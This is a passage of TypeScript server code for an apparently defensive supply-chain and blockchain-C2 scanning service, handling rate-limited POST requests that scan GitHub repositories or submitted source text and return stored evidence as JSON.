fensive blockchain-C2 and developer supply-chain evidence platform"}),{headers:hs("application/json")});
 }
 if(req.method==="POST"&&(u.pathname==="/api/scan/github"||u.pathname==="/api/scan")){
  const rl=rateAllowed(req);
  if(!rl.ok) return new Response(JSON.stringify({error:"rate limit exceeded",retryAfter:rl.retryAfter}),{status:429,headers:{...hs("application/json"),"retry-after":String(rl.retryAfter)}});
 }
 if(req.method==="POST"&&u.pathname==="/api/scan/github"){
  let body:any; try{body=await req.json();}catch{return new Response(JSON.stringify({error:"invalid body"}),{status:400,headers:hs("application/json")});}
  let repoUrl=String(body?.repoUrl||"").trim();
  if(!repoUrl&&body?.owner&&body?.repo) repoUrl="https://github.com/"+String(body.owner).trim()+"/"+String(body.repo).trim();
  try{
   const result=await scanGithub(repoUrl);
   const decision=await enrichDecision("github-repository",repoUrl,result);
   const evidence=await persistEvidence("github-repository",repoUrl,{...result,...decision});
   return new Response(JSON.stringify({...result,...decision,status:evidence.status==="PASS"?"PASS":"PARTIAL",evidence}),{headers:hs("application/json")});
  }catch(e:any){return new Response(JSON.stringify({error:String(e?.message||e),status:"FAIL"}),{status:400,headers:hs("application/json")});}
 }
 if(req.method==="POST"&&u.pathname==="/api/scan"){
  let body:any; try{body=(req.headers.get("content-type")||"").includes("application/json")?await req.json():{content:await req.text()};}catch{return new Response(JSON.stringify({error:"invalid body"}),{status:400,headers:hs("application/json")});}
  const content=String(body?.content||""); if(!content.trim()) return new Response(JSON.stringify({error:"content is required"}),{status:400,headers:hs("application/json")});
  if(new TextEncoder().encode(content).length>1000000) return new Response(JSON.stringify({error:"1 MB MVP limit"}),{status:413,headers:hs("application/json")});
  const result=scan(content,String(body?.path||"api-input"));
  const decision=await enrichDecision("source-text",content,result);
  const evidence=await persistEvidence("source-text",content,{...result,...decision});
  return new Response(JSON.stringify({...result,...decision,status:evidence.status==="PASS"?"PASS":"PARTIAL",evidence}),{headers:hs("application/json")});
 }
 return new Response(JSON.stringify({error:"not found"}),{status:404,headers:hs("application/json")});
}});
